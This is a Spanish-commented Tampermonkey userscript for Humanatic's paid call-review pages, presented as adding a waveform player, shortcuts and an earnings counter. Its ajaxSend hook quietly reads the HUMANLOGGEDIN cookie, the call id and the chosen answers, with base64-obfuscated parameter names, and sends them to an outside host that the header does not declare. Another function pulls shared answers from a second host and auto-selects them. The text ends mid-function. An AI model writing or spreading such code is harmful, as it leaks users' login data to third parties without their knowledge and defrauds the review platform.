// ==UserScript==
// @name         HumFun3.1
// @namespace    http://tampermonkey.net/
// @version      2.4.8.6
// @description  Añade funcionalidades extras a Humafun!
// @author       Jose 
// @match        https://www.humanatic.com/pages/humfun/review.cfm*
// @match        https://www.humanatic.com/pages/humfun/selection_review.cfm*
// @match        https://www.humanatic.com/pages/humfun/category.cfm*
// @match        https://www.humanatic.com/pages/humfun/profile.cfm*
// @require      https://cdnjs.cloudflare.com/ajax/libs/wavesurfer.js/1.1.2/wavesurfer.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/wavesurfer.js/1.0.57/plugin/wavesurfer.timeline.min.js
// @connect      sessopiggy.com
// @connect      www.guarrascachondas.com
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/34126/HumFun31.user.js
// @updateURL https://update.greasyfork.org/scripts/34126/HumFun31.meta.js
// ==/UserScript==
/*jshint multistr: true */
/*jshint -W030 */

if(document.cookie.indexOf('HUMANATIC_UID') === -1){
    console.log('Arreglando...');
    $.ajax({
        type: 'get',
        url: 'https://www.humanatic.com/pages/humfun/settings.cfm',
        success: function(data){
            document.cookie = "HUMANATIC_UID="+pID(data).id;
        }
    });
    return 0;
}

if(document.body.innerHTML.indexOf('Service Unavailable') !== -1 || document.body.innerHTML.toLowerCase().indexOf('error interno') !== -1) {
    document.body.innerHTML = 'Error interno de Humanatic, recargando en 3 segundos...';
    document.body.innerHTML+='</br>El tiempo de espera es para evitar colapsar la pagina'
    setTimeout(function(){location.reload();},3000);
    return 0;
}

user_id = '';
opc_ls = [];
try{$('span,span *').css({'user-select':'initial'});}catch(e){}

switch(true){
    case /https:\/\/www.humanatic.com\/pages\/humfun\/review.cfm/.test(location.href):
        InitReview();
        break;
    case /https:\/\/www.humanatic.com\/pages\/humfun\/selection_review.cfm/.test(location.href):
        $('.category_new').has('a[href="profile.cfm?uid='+gID($('html'))+'"]').insertAfter('.section-title.comments:contains("Review History")');
        var idCall = $('.review_title b').text().split('#')[1].replace(' ','');
        history.replaceState( {} , 'Select', 'selection_review.cfm?cid=' + idCall);
        if(!localStorage.getItem('caudits')){
            var caudits = {};
            caudits[$('.review_title b').text().split('#')[1].replace(' ','')] =  {
                idCat: $('.category_new').has('a[href="profile.cfm?uid='+gID($('html'))+'"]').find('.category-name').text().split(' ')[2],
                penalized: $('.category_new[style="border: 2px solid red;"] a[href="profile.cfm?uid='+gID($('html'))+'"]').length>0?true:false
            };
            /*audits.push({
                id: $('.review_title b').text().split('#')[1].replace(' ',''),
                penalized: !!$('.category_new[style="border: 2px solid red;"] a[href="profile.cfm?uid='+gID($('html'))+'"]').length
            });*/
            localStorage.setItem('caudits',JSON.stringify(caudits));
        } else {
            var caudits = JSON.parse(localStorage.getItem('caudits'));
            if(!caudits[idCall]){
                caudits[$('.review_title b').text().split('#')[1].replace(' ','')] =  {
                    idCat: $('.category_new[style="border: 2px solid red;"]').has('a[href="profile.cfm?uid='+gID($('html'))+'"]').find('.category-name').text().split(' ')[2],
                    penalized: !!$('.category_new[style="border: 2px solid red;"] a[href="profile.cfm?uid='+gID($('html'))+'"]').length
                };
                localStorage.setItem('caudits',JSON.stringify(caudits));
            }
        }
        break;
    case /https:\/\/www.humanatic.com\/pages\/humfun\/category.cfm/.test(location.href):
        $('div.category-selection-button > a[href*="category"]').each(function(){
	        this.href = this.href.replace("/?category",".cfm?hcat");
        });
        $('.top-bar').after($('<button id="alarmStartButton" style="width:50%;margin-left:25%;margin-top:5px;">Configurar Alerta de Llamadas</button>'));
        $('<audio id="alarmAudio" src="https://dl.dropboxusercontent.com/u/99616876/alarma.mp3" preload="auto">').appendTo('body');
        alarmAudio.onended = function(){this.play();};
        alarmStartButton.onclick = alarmConfigurate;
        cats = $('.catLink.linkLink').map(function(e){
            return {label: this.innerText, id: this.id, n: parseFloat($('.category-column-2')[e].innerText.match(/\d/g).join(''))};
        });
        if(localStorage.getItem('alarmActive')){
            if(localStorage.getItem('alarmActive') == 'true'){
                console.log(1);
                $('<div id="alarmFloat">').attr('style','position: fixed; top: 0px; width: 50%;left: 25%;text-align: center;background: green;color: white;padding: 5px;border-bottom-left-radius: 20px;border-bottom-right-radius: 20px;cursor: pointer;').text('La Alerta de llamadas esta ').append('<span id="alarmStatus">Activada</span>').appendTo('body')[0].onclick = function(){
                    var c=$(this).find('span').text();
                    if(c=='Activada'){
                        $(this).find('span').text('Desactivada');
                        this.style.background = 'red';
                        localStorage.setItem('alarmActive','false');
                        if(!alarmAudio.paused) alarmAudio.pause();
                    } else {
                        $(this).find('span').text('Activada');
                        this.style.background = 'green';
                        localStorage.setItem('alarmActive','true');
                    }
                };console.log(2);
                var c=$(this).find('span').text();
                if(c=='Activada'){
                    $('<div id="alarmFloat">').find('span').text('Activada');
                    $('<div id="alarmFloat">')[0].style.background = 'red';
                } else {
                    $('<div id="alarmFloat">').find('span').text('Desactivada');
                    $('<div id="alarmFloat">')[0].style.background = 'green';
                }console.log(3);
                var doo = false;
                var txtCat = '';
                JSON.parse(localStorage.getItem('catsSelect')).forEach(function(e){
                    var t=e;
                    var tmpMin = cats.filter(function(){return this.label==t.label;})[0].n;
                    if(tmpMin >= t.min) {
                        doo=true;
                        txtCat+=', ' + t.label.split(' ').map(function(e){return e[0];}).join([]).toUpperCase() + ': ' + tmpMin;
                    } //else doo=false;
                });console.log(4);
                if(doo){
                    alarmAudio.play();
                    smsConfig = JSON.parse(localStorage.getItem('smsConfig'));
                    smsConfig.sms.text = '!Despierta! Hay' + txtCat.substr(0,128);
                    smsLogin(smsConfig.login.user,smsConfig.login.pass,smsSend);
                }
                else {setTimeout(function(){location.reload();},60000);console.log('Reinicio programado en 1min.');}
            } else {console.log(5);
                    $('<div id="alarmFloat">').attr('style','position: fixed; top: 0px; width: 50%;left: 25%;text-align: center;background: green;color: white;padding: 5px;border-bottom-left-radius: 20px;border-bottom-right-radius: 20px;cursor: pointer;').text('La Alerta de llamadas esta ').append('<span id="alarmStatus">Desactivada</span>').appendTo('body')[0].onclick = function(){
                        var c=$(this).find('span').text();
                        if(c=='Activada'){
                            $(this).find('span').text('Desactivada');
                            this.style.background = 'red';
                            localStorage.setItem('alarmActive','false');
                            if(!alarmAudio.paused) alarmAudio.pause();
                        } else {
                            $(this).find('span').text('Activada');
                            this.style.background = 'green';
                            localStorage.setItem('alarmActive','true');
                        }
                    };
                    alarmFloat.style.background = 'red';
                   }
        }
        break;
}

function InitReview(){
    console.log("InitReview");
    setTimeout(bID,1);
    declareAll();
    audioSrc = '';
    sendThisCall = false;
    isSkip = false;
    iframe_Loaded = false;
    opl = false;
    lang = "";
    $(document.head).append('<style>.headset-focus{border:2px solid}</style>');
    flotante = document.createElement('div');
    console.log("anteee");
    console.log("Pasado");
    $('[class*="humfun-review-section-"]').css({width:'100%'});
    $('.humfun-options-list-item').css({padding: '5px 24px'});
    $('.humfun-options-section.module-section').css({margin:0});
    $('.humfun-review-section-right').css({'padding-left':'0px'});
    $('.humfun-review-section-left').css({'padding-right':'0px'});
    flotante.setAttribute('style',"width:100%;text-align:center;z-index: 1000;  top: 0px;  position: fixed; ");
    flotante.innerHTML = '<spam id="cToday" style="color:white;background:gray;padding-top:10px;padding-bottom:10px;"> Hoy: 0 Calls | 0$</spam>';
    document.body.appendChild(flotante);
    cToday.onmouseover = function(){
        setTimeout(function(){
            cToday.textContent ='Saldo: $' + ((typeof money === 'undefined') ? getStim():money) + " | Hoy: " + localStorage.getItem('ncall').split(':')[1] + " Calls, $" + parseFloat(localStorage.getItem('diff') || 0).toFixed(2);
        },1);
    };
    cToday.onmouseout = function(){
        setTimeout(function(){
            cToday.textContent ='Saldo: $' + ((typeof money === 'undefined') ? getStim():money) + " | Hoy: " + localStorage.getItem('ncall').split(':')[1] + " Calls, $" + parseInt(localStorage.getItem('diff') || 0);
        },1);
    };
    if(localStorage.getItem('ncall') !== null){
        setTimeout(function(){
            cToday.textContent ='Saldo: $' + ((typeof money === 'undefined') ? getStim():money) + " | Hoy: " + localStorage.getItem('ncall').split(':')[1] + " Calls, $" + parseInt(localStorage.getItem('diff') || 0);
        },1);
    }
    Date.prototype.fecha = function() {
        var mm = this.getMonth() + 1;
        var dd = this.getDate();

        return [this.getFullYear(), !mm[1] && '0', mm, !dd[1] && '0', dd].join('');
    };
    $(window).unload(function(){
        betaSkipCall(false);
    });
    WC();
}

function copyToClipboard(text) {
    window.prompt("Copy to clipboard: Ctrl+C, Enter", text);
}

function declareAll(){
    cookies = {
        get: function(name){
            var c=document.cookie.split(';');
            var cr;
            for(var i=0; i<c.length; i++){
                var co = c[i].split('=');
                if(name==co[0].replace(/ /g,"")) return co[1];
            }
        },
        set: function(name,value){document.cookie = name+"="+value;},
        remove: function(name){
            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
        }
    };
    String.prototype.intoStrings = function(s1,s2){
        return this.substring(this.indexOf(s1)+s1.length, this.indexOf(s2,this.indexOf(s1)+s1.length));
    };
    String.prototype.contains = function(cad){
        return this.indexOf(cad) !== -1;
    };
    Array.prototype.toText = function(){
        return JSON.stringify(this);
    };
    String.prototype.toFloat = function(){
        return parseFloat(this);
    };
    String.prototype.toInt = function(){
        return parseInt(this);
    };
    getStim = function (){
        return parseFloat($($.ajax({
            url: 'https://www.humanatic.com/pages/humfun/settings.cfm',
            async: false
        }).responseText).find('.current-unpaid').text().split(': ')[1].replace( /^\D+/g, ''));
    };
}

function addContextMenu(selector, items){
    $(selector).get(0).oncontextmenu = function(e){
        var css = '.context-menu-panel { z-index:1000; background:white;border-radius: 5px; box-shadow: 3px 3px 10px #888888; padding: 5px; } .context-menu-panel>.context-menu-item{ display:block; padding:3px 5px; } .context-menu-panel>.context-menu-item:hover{ background: blue; color:white; cursor:pointer; border-radius: 3px; }';
        if($('.context-menu-panel').length>0) $('.context-menu-panel').hide(100,function(){this.remove();});
        $('body').append('<ulP class="context-menu-panel" style="display:none">');
        $('.context-menu-panel').append('<style>'+css+'</style>');
        $('.context-menu-panel').css({position:'fixed',top:e.clientY-10,left:e.clientX+5});
        $.each(items,function(n,item){
            $('.context-menu-panel').append('<liP class="context-menu-item">');
            $('.context-menu-item:last').append('<spanP>'+( (typeof item.name==='function')?item.name():item.name )+'</spanP>');
            $('.context-menu-item:last').click(item.callback);
            $('.context-menu-item:last').click(function(){
                $('.context-menu-panel').remove();
            });
            $('.context-menu-item:last').click(function(){
                document.onclick();
            });
        });
        $('.context-menu-panel').css({width: ($('.context-menu-item>span').width)});
        old_document_onclick = document.onclick;
        document.onclick = function(){
            if(typeof old_document_onclick !== 'undefined') document.onclick = old_document_onclick;
            $('.context-menu-panel').hide(100,function(){this.remove();});
        };
        $('.context-menu-panel').show(100);
        return false;
    };
}

function WC(){
    if($('.humfun-options-list-inactive').length>0){
        $('.humfun-options-list-inactive').remove();
    }
    if($('.cfdump_struct').length){
        location.reload();
        return;
    }
    try{
        if(divCarga.style.width==='100%'){
            $(divCarga).animate({opacity:0},1000);
        }
    }catch(e){}
    if(!$('.humfun-options-list-inactive').is(":visible") && !opl){
        $('.humfun-options-list-item').css({padding: '5px 24px'});
        $('[class="humfun-options-header"],[class="humfun-options-premium"]').remove();
        $('[class="humfun-options-list-item-circle"]').css({height:'30px'});
        $('[class="humfun-options-list-item ripple-btn"]').css({padding: '5px 5px'});
        opl = true;
    }
    if($._data(document).events){
        if(typeof $._data(document,"events").ajaxSend === 'undefined') {
            $(document).ajaxSend(function( event, request, settings ) {
                console.log(settings.url + ":::::::::::::::::::");
                if( settings.url === "reviewer_module.cfm"){
                    //money = getStim();
                } else if(settings.url.indexOf("review_intermediate.cfc?method=attempt_review") !== -1){//if(settings.url.indexOf("review_ajax.cfm?method=process_review") !== -1){
                    console.log("Entre aqui!!");
                    wavesurfer.stop();
                    sendThisCall = true;
                    money = cToday.textContent.intoStrings(': $',' |').toFloat();
                    if(localStorage.getItem('ncall') !== null){
                        if(localStorage.getItem('ncall').split(':')[0] != new Date().fecha()){
                            localStorage.setItem('ncall', new Date().fecha() + ":0");
                            localStorage.setItem('diff','0');
                        }
                        localStorage.setItem('ncall', new Date().fecha() + ":" + (parseInt(localStorage.getItem('ncall').split(':')[1]) + 1) );
                        cToday.textContent = 'Saldo: $'+money+" | Hoy: " + localStorage.getItem('ncall').split(':')[1]  + " Calls, $" + parseInt(localStorage.getItem('diff') || 0);
                    } else {
                        localStorage.setItem('ncall', new Date().fecha() + ":1");
                        cToday.textContent = 'Saldo: $'+money+" | Hoy: " + localStorage.getItem('ncall').split(':')[1]  + " Calls, $" + parseInt(localStorage.getItem('diff') || 0);
                    }
                    //////////////////////////////////////////////////////////
                    var p1 = document.cookie.split(';').filter(function(e){
                        return e.split('=')[0].trim() === 'HUMANLOGGEDIN';
                    })[0].trim().split('=')[1];; //userid
                    var p2 = settings.url.split('?')[1].split(atob('Y2FsbGlkPQ=='))[1].split('&')[0];//callid
                    var p3 = pageHcat//catid;
                    var p5 = 'false';
                    var p4 = '';
                    if(typeof opc_ls !== 'undefined'){
                        if(opc_ls.length>0){
                            var p4 = opc_ls.toText();//hcat_option
                            p5 = 'true';
                        } else {
                            var p4 = settings.url.split('?')[1].split(atob('aGNhdF9vcHRpb249'))[1].split('&')[0];//hcat_option
                        }
                    } else {
                        var p4 = settings.url.split('?')[1].split(atob('aGNhdF9vcHRpb249'))[1].split('&')[0];//hcat_option
                    }
                    console.log('Este?: '+"http://generacionenlinea.com/hf.php?sres=1&id="+p1+"&idc="+p2+"&idct="+p3+"&r="+(p5==='true'?btoa(p4):p4)+"&iscon="+p5);
                    GM_xmlhttpRequest({
                        method: "GET",
                        url: "http://generacionenlinea.com/hf.php?sres=1&id="+p1+"&idc="+p2+"&idct="+p3+"&r="+(p5==='true'?btoa(p4):p4)+"&iscon="+p5,
                        onload: function(response) {
                            console.log('OK!!');
                        }
                    });
                    ///////////////////////////////////////////////////////////
                }
            });
        }
        if($._data(document).events.ajaxError === undefined){
            $(document).ajaxError(function (event, jqxhr, settings) {
                if(jqxhr.statusText === 'abort') return true;
                console.log('Retry ('+(settings.nretry?(settings.nretry+1):1)+'): '+settings.url);
                if(settings.nretry === undefined) {
                    settings.nretry = 1;
                    $.ajax(settings);
                } else {
                    if(settings.nretry<3){
                        settings.nretry += 1;
                        $.ajax(settings);
                    } else {
                        console.log('Retry limit ended, for retry manually:: ');
                        console.log(settings);
                        console.log('End Of manually retry section::');
                    }
                }
            });
        }
    }

    if($('#iframe_callback').length>0){
        if($._data($(iframe_callback)[0],'events') === undefined){
            jQuery(iframe_callback).load(function(){
                if($._data($(iframe_callback).contents().find('form')[0],'events') === undefined){
                    jQuery(iframe_callback).contents().find('form').submit(function(){
                        var idc = $(this).find('[name="frn_hcatid"]')[0].value;
                        var opc = $(this).find('input[type="radio"]:checked')[0].value;
                        opc_ls.push({idc: idc, opc: opc});
                    });
                }
                $('[id="chon"]').remove();
                $('[id="coinci"]').css({background: ''});
                if(typeof res_ops !== 'undefined')
                    try{
                        res_ops.forEach(function(e){
                            if(jQuery(iframe_callback).contents().find('form').find('[name="frn_hcatid"]')[0].value === e.idc){
                                jQuery(iframe_callback).contents().find('form').find('input[type="radio"]').filter(function(){
                                    return this.value == e.opc;
                                })
                                    .css({background: 'rgba(40, 156, 65, 0.19)'})
                                    .append($('<span id="chon" style=display:inline-block;position:absolute;right:0;z-index:999999999;color:#000;font-size:20px>( '+1+' )</span>'))
                                    .attr('id','coinci').click();
                            }
                        });}catch(e){console.log(e);};
            });
        }
        if($('#iframe_callback')[0].onload !== null){
            $('#iframe_callback')[0].onload = function () {
                try{
                    var iFrameID = document.getElementById('iframe_callback');
                    if(iFrameID) {
                        setTimeout(function(){
                            iframe_callback.height = "";
                            iframe_callback.height = $(iframe_callback).contents().find("html")[0].getClientRects()[0].height;
                        },1000);
                        $(iFrameID).contents().find('.option label').css({padding:'0px'});
                        $(iFrameID).contents().find('.option label span:not([class])').css({padding:'5px 8px'});
                        $('#iframe_callback').contents().get(0).body.onkeypress = function(ke){window.parent.document.body.onkeypress(ke);};
                        $('#iframe_callback').contents().get(0).body.onkeydown = function(ke){window.parent.document.body.onkeydown(ke);};
                        $('#iframe_callback').contents().get(0).body.onkeyup = function(ke){window.parent.document.body.onkeyup(ke);};
                        iframe_Loaded = true;
                        $('.summary-label').remove();
                    }
                    this.onload = null;
                    jQuery(iframe_callback).load();
                }catch(e){}

            };
            $('#iframe_callback')[0].onload();
        }

    }

    if(typeof preloadedCallArray !== 'undefined'){
        if(preloadedCallArray.length>0){
            for(var i=0; i<preloadedCallArray.length;i++){
                if(preloadedCallArray[i].audio_file !== undefined){
                    var dif_time = parseInt((new Date().getTime() - new Date(parseInt(preloadedCallArray[i].audio_file.split('?')[1].split('&Expires=')[1].split('&')[0]+'000')).getTime())/1000/60);
                    var tt_time = new Date(new Date().getTime()).toString();
                    var tt_deci = tt_time.indexOf('Venezuela')>=0?(tt_time.indexOf('GMT-0430')>=0?true:false):false
                    if(dif_time >= 10+(tt_deci?20:0)) preloadedCallArray[i] = "";
                }
            }
            if(audioSrc !== preloadedCallArray[0].audio_file && preloadedCallArray[0].audio_file !== undefined){
                audioSrc = preloadedCallArray[0].audio_file;
                if(typeof otherPreload !== 'undefined') otherPreload.abort();
                if($('audio[class*="'+ $('.humfun-audio-header-call-id').text() +'"]').length>0){
                    ele_audio = $('audio[class*="'+ $('.humfun-audio-header-call-id').text() +'"]').get(0);
                    ele_audio.pause();
                    ele_audio.src = '';
                    ele_audio.remove();
                    delete ele_audio;
                }
                if(typeof audio !== 'undefined') {
                    audio.pause();
                    audio.src = '';
                    audio.remove();
                    delete audio;
                }
                $('.audio-player').html('');
                try{
                    try{audioSource.context.suspend();}catch(e){}
                    bufferRequest.abort();
                    loadAudioBuffer = function(){console.log("Jejeje");};
                }catch(e){}
                setTimeout(cambio,1);
                setTimeout(WC,1000);
            } else {
                try{
                    try{audioSource.context.suspend();}catch(e){}
                    bufferRequest.abort();
                    loadAudioBuffer = function(){console.log("Jejeje");};
                }catch(e){}
                if(typeof audio !== 'undefined') {
                    audio.pause();
                    audio.src = '';
                    audio.remove();
                    delete audio;
                }
                setTimeout(WC,1000);
            }
        } else {
            setTimeout(WC,100);
        }
    } else {
        if(audioSrc === '' || typeof preloadedCallArray === 'undefined') {setTimeout(WC,100);}
        else {
            try{;
               }catch(e){
                   //console.log(e);
               }
            setTimeout(WC,500);
        }
    }
}

function cambio(){
    if(localStorage.getItem('ncall') !== null){
        if(localStorage.getItem('ncall').split(':')[0] != new Date().fecha()){
            localStorage.setItem('ncall', new Date().fecha() + ":0");
            localStorage.setItem('diff','0');
        }
    } else {
        localStorage.setItem('ncall', new Date().fecha() + ":1");
    }
    if(typeof money === 'undefined'){
        setTimeout(function(){
            money = getStim();
            cToday.textContent = 'Saldo: $'+money+" | Hoy: " + localStorage.getItem('ncall').split(':')[1]  + " Calls, $" + parseInt(localStorage.getItem('diff') || 0);
        },1);
    } else {
        setTimeout(function(){
            moneyAfter = getStim();
            diff = moneyAfter - money;
            localStorage.setItem('diff',(parseFloat(localStorage.getItem('diff') || 0) + diff));
            money = moneyAfter;
            cToday.textContent = 'Saldo: $'+money+" | Hoy: " + localStorage.getItem('ncall').split(':')[1]  + " Calls, $" + parseInt(localStorage.getItem('diff') || 0);
        },1);
    }
    $('[id="chon"]').remove();
    $('[id="coinci"]').css({background: ''});
    if(localStorage.getItem('acsc') === 'true')
        GM_xmlhttpRequest({
            method: "GET",
            url: "http://guarrascachondas.com/hf.php?lres=1&idc="+$(atob('Lmh1bWZ1bi1hdWRpby1oZWFkZXItY2FsbC1pZA==')).text()+"&idct="+pageHcat+"&iscon="+($('#iframe_callback').length>0?"true":"false"),
            onload: function(response) {
                if(JSON.parse(response.responseText).res !== 'null'){
                    res_ops = JSON.parse(response.responseText).res;
                    console.log("YH!");
                    if($('#iframe_callback').length>0){
                        console.log(JSON.parse(response.responseText).res);
                        JSON.parse(response.responseText).res.forEach(function(e){
                            if(jQuery(iframe_callback).contents().find('form').find('[name="frn_hcatid"]')[0].value === e.idc){
                                jQuery(iframe_callback).contents().find('form').find('input[type="radio"]').filter(function(){
                                    return this.value == e.opc;
                                })
                                    .css({background: 'rgba(40, 156, 65, 0.19)'})
                                    .append($('<span id="chon" style=display:inline-block;position:absolute;right:0;z-index:999999999;color:#000;font-size:20px>( '+1+' )</span>'))
                                    .attr('id','coinci').click();
                            }
                        });
                    } else {
                        $('.humfun-options-list-items>div').filter(function(){return $(this).find(".humfun-options-list-item-hco").text() === JSON.parse(response.responseText).res})
                            .css({background: 'rgba(40, 156, 65, 0.19)'})
                            .append($('<span id="chon" style=display:inline-block;position:absolute;right:0;z-index:999999999;color:#000;font-size:20px>( '+JSON.parse(response.responseText).n+' )</span>'))
                            .attr('id','coinci');
                    }


                }
            }
        });
    cTime = parseInt(new Date().getTime() / 1000);
    sendThisCall = false;
    isSkip = false;
    cRecent = true;
    opc_ls = [];
    if(typeof request !== 'undefined') request.abort();
    $('.humfun-audio-header')[0].scrollIntoView();
    $('.audio-player').html('<div id="waveform"></div><div id="waveform-timeline"></div><div class="controls"></div>');
    $('.controls').html('<button id="back">Back</button><button id="play">Play/Pause</button><button id="avance">Advance</button><button id="omitir">Omitir</button>');
    $('.controls button').append('<style>.controls>button{width:'+parseInt(100/$('.controls button').length)+'%;background-color: gren;border: 1px solid blue;color: black;padding: 10px 32px;text-align: center;text-decoration: none;font-size: 16px;cursor: pointer; }.controls>button:hover {background-color: blue;color: white;}</style>');
    $('.premium-payout-label br').remove();
    $('.premium-payout-label').css({'line-height':'0px','margin-bottom':'5px'});
    $('.submit-button').css({'max-width':'100%'});
    $('.review-buttons').css({margin:'5 auto 5 auto'});
    iframeLoaded = function () {
        try{
            var iFrameID = document.getElementById('iframe_callback');
            if(iFrameID) {
                iFrameID.height = "";
                iFrameID.height = $(iFrameID).contents().find("html")[0].getClientRects()[0].height;
                $(iFrameID).contents().find('.option label').css({padding:'0px'});
                $(iFrameID).contents().find('.option label span:not([class])').css({padding:'5px 8px'});
                $('#iframe_callback').contents().get(0).body.onkeypress = function(ke){window.parent.document.body.onkeypress(ke);};
                $('#iframe_callback').contents().get(0).body.onkeydown = function(ke){window.parent.document.body.onkeydown(ke);};
                $('#iframe_callback').contents().get(0).body.onkeyup = function(ke){window.parent.document.body.onkeyup(ke);};
                iframe_Loaded = true;
                $('.summary-label').remove();
            }
        }catch(e){}
    };
    $('.options').width('100%');
    $('.option label span:not([class])').css({padding:'5px 8px'});
    $('.option label').css({padding:'0px'});
    wavesurfer = Object.create(WaveSurfer);
    wavesurfer.init({
        container: document.querySelector('#waveform'),
        waveColor: 'gray',
        progressColor: 'blue',
        hideScrollbar: true,
        backend: localStorage.getItem('backend')?localStorage.getItem('backend'):'WebAudio'
    });
    addContextMenu('#waveform',[
        {
            name:'Copy MP3 URL',
            callback:function(){
                copyToClipboard(audioSrc);
            }
        },
        {
            name:function(){return new Date() > new Date(parseInt(audioSrc.split('&')[1].split('=')[1]+'000'))?'El link Expiro':'Download MP3';},
            callback:function(){
                if(this.innerText !== 'Download MP3') return true;
                $('<a download href="'+audioSrc+'">').get(0).click();
            }
        },
        {
            name:function(){ return (localStorage.getItem('backend')?'Disable':'Enable')+' PlayWhileLoading';},
            callback:function(){
                localStorage.getItem('backend')?(localStorage.removeItem('backend')):(localStorage.setItem('backend','MediaElement'));
            }
        },
        {
            name:function(){ return (localStorage.getItem('callFocus')?'Disable':'Enable') + ' focus';},
            callback: function(){
                localStorage.getItem('callFocus')?(localStorage.removeItem('callFocus')):(localStorage.setItem('callFocus',' '));
            }
        },
        {
            name:"Exit Menu",
            callback:function(){
                document.onclick();
            }
        }
    ]);
    wavesurfer.on('pause',function(){play.innerHTML='Play';});
    wavesurfer.on('play',function(){play.innerHTML='Pause';});
    play.onclick = function(){wavesurfer.playPause();};
    avance.onclick = function(){wavesurfer.skipForward();};
    back.onclick = function(){wavesurfer.skipBackward();};
    omitir.onclick = betaSkipCall;
    omitir.innerHTML = (lang === undefined)?'Omitir: EN':'Omitir: ES';
    omitir.oncontextmenu = function(){
        if(this.innerHTML.indexOf('ES') != -1) {this.innerHTML = "Omitir: EN"; lang=undefined;} else {this.innerHTML = "Omitir: ES"; lang='';}
        return false;
    };
    wavesurfer.load(audioSrc);
    if($('#divCarga').length === 0)
        $('#waveform>wave').append('<div style="height: 100%; width: 0%; background: lightblue;" id="divCarga"></div>');
    window.onresize = function(){wavesurfer.drawBuffer();};
    wavesurfer.on('ready', function () {
        if(preloadedCallArray[1] !== undefined){
            otherPreload = $.ajax(preloadedCallArray[1].audio_file);
        } else {
            preloadedCallArray.push("");
        }
        $('.humfun-audio-header')[0].scrollIntoView();
        try{audioSource.context.suspend();}catch(e){}
        $('.change-category').css({display:'block'});
        $('.humfun-audio-header').append('<span id="spl" style="width:10%; display: inline-block;font-size:20px;">Speed: 1</span>')
            .append('<input id="spi" type="range" min="0.5" max="2" step="0.1" value ="1" style="display:inline-block;width:80%">');
        if(localStorage.getItem("spi") !== null) {
            spi.value = localStorage.getItem("spi");
            spl.innerHTML = 'Speed: '+spi.value;
            wavesurfer.setPlaybackRate(spi.value);
        }
        spi.oninput =function(e){
            spl.innerHTML = 'Speed: '+this.value;
            wavesurfer.setPlaybackRate(this.value);
            localStorage.setItem("spi",this.value);
        };
        if(localStorage.getItem('callFocus') === null){
            wavesurfer.play();
        } else {
            if(document.hasFocus()){
                wavesurfer.play();
            } else {
                window.onfocus = function(){
                    wavesurfer.play();
                    this.onfocus = null;
                };
            }
        }
        if(!isSkip)
            $('.large_container').attr('style','');
        console.log('Listo');
        timeline = Object.create(WaveSurfer.Timeline);
        $('#waveform-timeline').html('');
        $('.audio-player').css({background:''});
        timeline.init({
            wavesurfer: wavesurfer,
            container: '#waveform-timeline'
        });
        $('#waveform-timeline canvas').css({position:'relative'});
        $('#waveform').css({background:'','margin-left':'0',width:"100%"});
    });
    wavesurfer.on('complete',function(){
        if(!isSkip)
            $('.large_container').attr('style','');
        //try{$(divCarga).animate({opacity:0},1000);}catch(e){}
        window.stop();
        $('.humfun-options-list-item').css({padding: '5px 24px'});
    });
    wavesurfer.on('loading', function (porcen) {
        try{audioSource.context.suspend();}catch(e){}
        if(cRecent) {cRecent = false;DA();}
        if(!isSkip)
            $('.large_container').attr('style','');
        console.log(porcen+"%");
        if(porcen>=100){
            try{$(divCarga).animate({opacity:0},1000);}catch(e){}
        }
        if($('#waveform wave').length > 0){
            if($('#divCarga').length === 0)
                $('#waveform>wave').append('<div style="height: 100%; width: 0%; background: lightblue;" id="divCarga"></div>');
            else
                $(divCarga).stop().animate({width:porcen+'%'},200);
        }
    });
    wavesurfer.on('error', function (e) {
        DA();
        $('#waveform').show(0).html('<p style="padding:5px;font-size:2em">Error en la llamada.</p><button id="bErr">Reintentar</button>');
        bErr.onclick = cambio;
    });
    audioprocess = function(a){
        if(!iframe_Loaded) iframeLoaded();
        if($('#time').length>0){
            var ad = wavesurfer.getDuration();
            var ad_ent=parseInt(ad/60);
            var ent=parseInt(a/60);
            var ad_dec=parseInt(((ad/60)%1)*60);
            var dec=parseInt(((a/60)%1)*60);
            time.innerHTML=ent+":"+("0" + dec).slice(-2) + " | " + ad_ent+":"+("0" + ad_dec).slice(-2);
        } else {
            $('<label id="time" style="font-size: 15px;padding: 0px 3px;border: solid blue 1px;">0:00</label>').insertAfter('#waveform>wave>wave');
        }
    };
    wavesurfer.on('audioprocess',audioprocess);
    $('#waveform canvas').each(function(){this.onclick=function(){audioprocess(wavesurfer.getCurrentTime());};});
}

function DA(){
    pauseAudio = function(){
        try{wavesurfer.stop();}catch(e){}
    };
    document.body.onkeypress = function(e){
        if(e.target.id === 'thetextbox') return true;
        var key = String.fromCharCode(e.keyCode);
        if(!isNaN(parseInt(key))) {
            if( $('.humfun-options-list-items>div').length > 1){
                $('.humfun-options-list-items>div:nth-child('+parseInt(key)+')').click();
            } else if($('#iframe_callback').length>0){
                $($('#iframe_callback').contents().find('input[name="option"]')[key-1]).click();
            }
        }
        else {
            var returnCode = false;
            switch(e.keyCode){
                case 13:
                    if($('.review-shadow-box.review-shadow-box-rewards:visible').length === 0){
                        if($('#iframe_callback').length>0){
                            try{
                                $('#iframe_callback').contents().find('input[type="submit"]')[0].click();
                            }catch(ee){
                                $('.special-submit-btn')[0].click();
                                wavesurfer.pause();
                                try{wavesurfer.cancelAjax();}catch(ed){}
                                $.ajax('',function(){

                                });
                                sendThisCall = true;
                            }
                        } else {
                            $('.humfun-options-list-item-active>.ripple-btn>div:visible').click();
                            wavesurfer.pause();
                            try{wavesurfer.cancelAjax();}catch(ed){}
                            sendThisCall = true;
                        }
                    }
                    else
                        $('.review-popup-dismiss-btn').click();
                    break;
                case 32:
                    play.click();
                    break;
                default:
                    returnCode = true;
                    break;
                    /*case 79: case 111:
                    omitir.click();
                    break;*/
            }
            return returnCode;
        }
    };
    document.body.onkeydown = function(e){
        $('#thetextboxs').off("cut copy paste");
        if(e.target.id === 'thetextbox') return true;
        if(String.fromCharCode(e.keyCode || e.which).toLowerCase() == "o"){
            omitir.click();
        }
        var returnCode = false;
        if(typeof tmp_time === 'undefined') {
            tmp_time = {
                time: 0,
                last: 'none',
                repit: 0,
                reset: function(){
                    console.log("Error, Reinicio");
                    this.time = 0;
                    this.last = "none";
                    this.repit = 0;
                }
            };
        }
        var tt_time = 0;
        console.log("dd: "+tmp_time.repit);
        switch(e.keyCode){
            case 176:
                if($('.headset-focus').hasClass("humfun-review-section-right"))
                    if($('.humfun-options-list-item-active:visible').length > 0){
                        $('.humfun-options-list-item-active:visible').prev().click();
                    } else {
                        $('.humfun-options-list-item:first').click();
                    }
